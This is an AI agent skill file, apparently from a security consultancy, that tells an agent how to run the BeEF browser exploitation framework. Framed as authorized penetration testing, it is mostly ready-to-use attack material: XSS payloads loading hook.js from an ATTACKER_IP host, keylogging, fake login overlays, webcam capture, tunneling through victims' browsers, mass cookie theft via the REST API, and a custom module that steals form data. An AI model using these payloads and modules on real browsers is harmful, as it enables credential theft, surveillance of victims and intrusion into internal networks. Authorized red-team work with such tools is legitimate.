---
name: beef-xss
description: >
  Operate BeEF (Browser Exploitation Framework) — a penetration testing tool that hooks browsers via
  a JavaScript payload and enables command-and-control of hooked browsers through a web UI and REST
  API. Use when demonstrating XSS impact, conducting browser-based attacks, chaining with Metasploit
  for post-exploitation, testing social engineering scenarios, or researching browser security.
  Covers installation (Docker, source), hook delivery, control panel, command modules (network,
  keylogger, social engineering, phishing, tunneling), REST API, custom modules, and attack methodology.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/beefproject/beef
  stars: '10.1k'
  language: Ruby
---

# beef-xss Agent Skill

## When to Use This Skill

Use this skill when:
- Demonstrating the real-world impact of an XSS vulnerability to a client
- Conducting authorized browser-based attack chains (social engineering, phishing via hooked browser)
- Integrating browser exploitation into a Metasploit campaign
- Building custom BeEF command modules for specific scenarios
- Testing browser fingerprinting, internal network discovery from browser context, or tunneling
- The user asks about XSS exploitation frameworks, hook.js delivery, or BeEF REST API

## What BeEF Does

BeEF hooks browsers via a small JavaScript payload (`hook.js`), turning each hooked browser into a
C2 session. Once hooked, the attacker can run hundreds of built-in command modules: enumerate browser
plugins and cookies, capture keystrokes, launch social engineering overlays, probe the victim's
internal network from within their browser, redirect the browser, and integrate with Metasploit to
pivot from browser compromise to full system exploitation.

## Installation

### Method 1 — Docker (recommended)

```bash
# Pull BeEF image
docker pull beefproject/beef

# Run BeEF — expose UI port (3000) and hook port (3000)
docker run -d --name beef \
  -p 3000:3000 \
  -p 6789:6789 \
  beefproject/beef

# Access UI
# http://localhost:3000/ui/panel
# Default credentials: beef / beef
```

### Method 2 — From Source (Ruby)

```bash
# Prerequisites
sudo apt install ruby ruby-dev build-essential libcurl4-openssl-dev git -y

# Clone repository
git clone https://github.com/beefproject/beef.git
cd beef

# Install Ruby dependencies
sudo gem install bundler
bundle install

# Start BeEF
./beef
```

### Method 3 — Kali Linux (pre-installed)

```bash
# Kali ships BeEF — update and run
sudo apt update && sudo apt install beef-xss -y
sudo beef-xss

# Or run directly
cd /usr/share/beef-xss
sudo ./beef
```

### Configuration

```bash
# Edit config before starting
nano config.yaml

# Key settings:
# beef:
#   credentials:
#     user: "beef"
#     passwd: "CHANGE_ME"
#   http:
#     host: "0.0.0.0"      # Listen interface
#     port: 3000
#     public: "ATTACKER_IP" # Public IP for hook.js generation
#   websocket:
#     enable: true
#   extensions:
#     metasploit:
#       enable: true
#       host: "127.0.0.1"
#       port: 55553
```

## Core Concepts

### hook.js Payload

`hook.js` is a JavaScript file served by BeEF's built-in HTTP server. When loaded in a victim browser
(via XSS, injected via MITM, or social engineering), it:
1. Establishes a polling connection back to the BeEF server
2. Registers the browser as a new "hooked browser" session
3. Executes command module payloads returned from the C2
4. Returns command results asynchronously

### Session Lifecycle

```
Browser loads hook.js
  → BeEF registers session (assigns unique BeEF ID)
  → Attacker sends command modules via UI or REST API
  → hook.js polls C2 (default: every 1 second)
  → Results returned to BeEF UI/API
  → Session alive as long as tab is open
```

### Control Panel Layout

URL: `http://ATTACKER_IP:3000/ui/panel`

- **Hooked Browsers** (left panel) — list of active and past browser sessions with OS/browser info
- **Details** tab — browser fingerprint, plugins, cookies, window size, geolocation
- **Logs** tab — all command results and events for this session
- **Commands** tab — module tree organized by category
- **Network** tab — discovered internal hosts via browser-based network scanner
- **XssRays** tab — results from XSS scanning of same-origin pages
- **Ipec** tab — IP discovery results

## hook.js Delivery Methods

### Method 1 — Reflected/Stored XSS

```html
<!-- Inject into vulnerable parameter -->
<script src="http://ATTACKER_IP:3000/hook.js"></script>

<!-- URL-encoded for GET parameter injection -->
%3Cscript%20src%3D%22http%3A%2F%2FATTACKER_IP%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E

<!-- Event-based (no script tag) -->
"><img src=x onerror="var s=document.createElement('script');
s.src='http://ATTACKER_IP:3000/hook.js';document.head.appendChild(s)">
```

### Method 2 — BeEF's Built-in Demo Page

```
http://ATTACKER_IP:3000/demos/basic.html
```

Use for testing / demonstration in lab environments.

### Method 3 — MITM (via ARP spoofing + BeEF's network proxy)

```bash
# BeEF can act as a proxy; route traffic through BeEF to inject hook.js
# Enable network extension in config.yaml, then:
# Configure browser to use BeEF as HTTP proxy: ATTACKER_IP:6789
```

### Method 4 — Social Engineering Page

Craft a phishing page that loads hook.js and presents a credential form.

## Command Modules Reference

Modules are organized under the Commands tab. Key categories:

### Browser Information

```
Commands > Browser > Hooked Domain
  - Get Cookie           — Retrieve document.cookie
  - Get Page Title       — Current page title
  - Get Page HTML        — Full DOM HTML
  - Fingerprint Browser  — Detect browser plugins, capabilities
  - Get All Windows      — Enumerate open tabs/windows
  - Get History          — Browser history (limited by SOP)
  - Detect Firebug       — Check if devtools open
```

### Network Discovery

```
Commands > Network > Fingerprint Network
  - Get Internal IP       — Victim's RFC1918 address via WebRTC
  - Network Discovery     — Scan internal subnet from victim browser
  - Port Scanner          — TCP port scan from within victim's network
  - Identify LAN Hosts    — Ping sweep via JavaScript image loading tricks
  - DNS Enumeration       — Resolve hostnames from victim's DNS resolver
```

### Social Engineering

```
Commands > Social Engineering
  - Fake Notification Bar  — Fake Firefox/Chrome update bar with malware link
  - Clickjacking           — Frame overlay to hijack clicks
  - Fake Flash Update      — Classic plugin update lure
  - TabNabbing             — Replace inactive tab content with phishing page
  - Pretty Theft           — Overlay dialog requesting Google/Facebook login
```

### Keylogger

```
Commands > Host > Keylogger
  - Sends all keystrokes typed in the hooked page back to BeEF
  - Works while the hooked tab is in focus
  - Results appear in Logs tab
```

### Webcam and Audio

```
Commands > Host > Get Webcam
  - Requests webcam access via getUserMedia API
  - Captures still image; browser shows permission prompt

Commands > Host > Get Microphone
  - Records audio via getUserMedia; requires user permission
```

### Tunneling Proxy

```
Commands > Network > Tunneling Proxy
  - Enables HTTP tunneling through victim's browser
  - Configure local SOCKS proxy to route through hooked browser
  - Access internal resources as the victim user
  - Port: 6789 (configurable in config.yaml)
```

### Metasploit Integration

```yaml
# config.yaml — enable Metasploit extension
extensions:
  metasploit:
    enable: true
    host: "127.0.0.1"
    port: 55553
    user: "msf"
    pass: "abc123"
    uri: "/api"
```

```bash
# msfconsole — load msgrpc plugin
msf6 > load msgrpc Pass=abc123 ServerPort=55553

# In BeEF Commands tab:
# Misc > Metasploit — browser exploits accessible here
# Use browser_autopwn2 or specific browser exploits
```

## REST API

BeEF exposes a REST API for automation. Authentication uses a token returned at startup or via login.

### Authentication

```bash
# Login and capture token
TOKEN=$(curl -s -c cookies.txt -X POST http://localhost:3000/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"beef","password":"beef"}' | jq -r '.token')
echo "BeEF token: $TOKEN"
```

### List Hooked Browsers

```bash
curl -s "http://localhost:3000/api/hooks?token=${TOKEN}" | jq '.'

# Response includes session ID, IP, browser type, OS, hooked URL
```

### Send a Command Module

```bash
# Get module list
curl -s "http://localhost:3000/api/modules?token=${TOKEN}" | jq '.'

# Execute module on a hooked browser (replace SESSION_ID and MODULE_ID)
curl -s -X POST "http://localhost:3000/api/modules/SESSION_ID/MODULE_ID?token=${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"execute": "true"}'

# Check command result
curl -s "http://localhost:3000/api/modules/SESSION_ID/MODULE_ID/COMMAND_ID?token=${TOKEN}" | jq '.'
```

### Automate Mass Hooks

```bash
# Get all online browser IDs
BROWSERS=$(curl -s "http://localhost:3000/api/hooks?token=${TOKEN}" | \
  jq -r '.hooked-browsers.online | keys[]')

# Send Get Cookie module (module ID varies; check /api/modules)
COOKIE_MODULE_ID=17

for BROWSER in $BROWSERS; do
  curl -s -X POST \
    "http://localhost:3000/api/modules/${BROWSER}/${COOKIE_MODULE_ID}?token=${TOKEN}" \
    -H "Content-Type: application/json" -d '{}' 
done
```

## Custom Modules

Custom modules live in `modules/` directory. Structure:

```
modules/my_module/
├── module.rb       — Ruby metadata and parameter definitions
└── command.js      — JavaScript executed in the hooked browser
```

### Example Custom Module

```ruby
# modules/steal_form_data/module.rb
class Steal_form_data < BeEF::Core::Command
  def self.options
    [{name: 'selector', ui_label: 'CSS Selector', value: 'form'}]
  end
  
  def post_execute
    save({'stolen_data' => @datastore['data']})
  end
end
```

```javascript
// modules/steal_form_data/command.js
var forms = document.querySelectorAll('<%= @selector %>');
var data = [];
forms.forEach(function(form) {
  var inputs = form.querySelectorAll('input, textarea, select');
  inputs.forEach(function(input) {
    data.push(input.name + '=' + input.value);
  });
});
beef.net.send('<%= @command_url %>', <%= @command_id %>, 'data=' + data.join('&'));
```

## Browser-Based Attack Methodology

### Phase 1 — Hook Delivery

1. Identify XSS vector (stored preferred for persistent hooks)
2. Inject hook.js script tag or equivalent
3. Confirm session appears in BeEF control panel

### Phase 2 — Reconnaissance

```
1. Run Fingerprint Browser → document OS, browser version, plugins
2. Run Get Internal IP → identify victim's RFC1918 address
3. Run Network Discovery → map internal subnets visible from victim
4. Run Port Scanner → identify live internal services
5. Run DNS Enumeration → discover internal hostnames
```

### Phase 3 — Exploitation

```
1. Keylogger → capture credentials typed in hooked domain
2. Pretty Theft → overlay fake login to capture credentials
3. Tunneling Proxy → route your browser through victim to access internal apps
4. Metasploit integration → launch browser exploits against victim
```

### Phase 4 — Reporting

Document the attack chain: XSS vector → hook URL → what data was accessible, what internal
resources were reachable, what social engineering was possible. Emphasize the real-world impact
(credentials, internal network access) to justify remediation priority.

## Troubleshooting

| Issue | Cause | Fix |
|-------|-------|-----|
| hook.js not loading | Firewall blocking port 3000 | Open port 3000 on attacker host |
| Session disappears | Tab closed or navigated away | Stored XSS for persistence; use iframes |
| Modules not returning results | Browser SOP blocking | Use same-origin XSS; check console errors |
| Metasploit not connecting | msgrpc not started or wrong creds | `load msgrpc Pass=abc123` in msfconsole |
| Docker container not starting | Port conflict | Change host port: `-p 3001:3000` |
| REST API 401 Unauthorized | Token expired or wrong | Re-login via `/api/admin/login` |
| Bundle install fails | Missing native deps | `sudo apt install libssl-dev libreadline-dev` |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
